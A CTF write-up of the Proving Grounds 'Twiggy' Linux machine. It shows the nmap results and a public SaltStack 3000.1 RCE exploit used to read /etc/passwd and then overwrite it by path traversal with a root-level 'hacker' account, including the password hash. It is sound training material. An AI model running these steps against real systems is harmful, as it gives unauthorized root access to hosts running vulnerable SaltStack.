---
title: "PG Practice: Twiggy"
created: "2023-08-27"
updated: "2026-04-11"
type: ctf-writeup
platform: Proving Grounds Practice
machine: "Twiggy"
os: Linux
status: rooted
tags:
  - - proving-grounds
  - pg-practice
  - linux
  - ctf
  - oscp
  - reverse-shell
  - file-upload
  - etcpasswd-manipulation
related:
  - "[[Reverse-Shell-Reference]]"
  - "[[File-Upload-to-RCE-Patterns]]"
  - "[[Linux-PrivEsc-Decision-Tree]]"
  - "[[Nmap-Enumeration-Methodology]]"
---

# PG Practice: Twiggy

> **Platform:** Proving Grounds Practice | **OS:** Linux | **Date:** 2023-08-27

---

## Quick Summary

**Open Ports:**
- 22/tcp (ssh)
- 53/tcp (domain)
- 80/tcp (http)
- 4505/tcp (zmtp)
- 4506/tcp (zmtp)
- 8000/tcp (http)

**Key Techniques:**
- Reverse Shell
- File Upload
- /etc/passwd Manipulation

**Privilege Escalation Path:**
- (See walkthrough)

---

## Full Walkthrough

Proving grounds Practice - Twiggy CTF writeup.

## Nmap

```sh
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
53/tcp   open  domain  NLnet Labs NSD
80/tcp   open  http    nginx 1.16.1
4505/tcp open  zmtp    ZeroMQ ZMTP 2.0
4506/tcp open  zmtp    ZeroMQ ZMTP 2.0
8000/tcp open  http    nginx 1.16.1
```

## Web
### PORT: 80


### PORT: 8000


The SaltStack Salt REST API is running.


SaltStack is vulnerable to [Saltstack 3000.1 - Remote Code Execution](https://www.exploit-db.com/exploits/48421)

## Exploitation

```sh
python exploit.py --master 192.168.174.62 --read /etc/passwd
```


unable to obtain reverse shell using the `--exec` command in the exploit but we will be able to create and add our own new user account to the `/etc/passwd` file.

### Create new user

```sh
openssl passwd hacked
$1$iBeMKMaU$.O3VYqCZxUvapPL.OQ97/1
```

`hacked` is the password.

Add the following to the `/etc/passwd` content we have extracted from the attacking machine.

```text
hacker:$1$iBeMKMaU$.O3VYqCZxUvapPL.OQ97/1:0:0:root:/root:/bin/bash
```

**Writing /etc/passwd file**

```sh
python exploit.py --master 192.168.174.62 --upload-src passwd --upload-dest ../../../../../../../../../../etc/passwd
```


**Verify the user existence**


SSH to the attacking machine using the username as `hacker` and password `hacked`.


**Root Obtained**

---

## Technique Links

- [[Reverse-Shell-Reference]]
- [[File-Upload-to-RCE-Patterns]]
- [[Linux-PrivEsc-Decision-Tree]]
- [[Nmap-Enumeration-Methodology]]
- [[Proving-Grounds-Master-Index]]
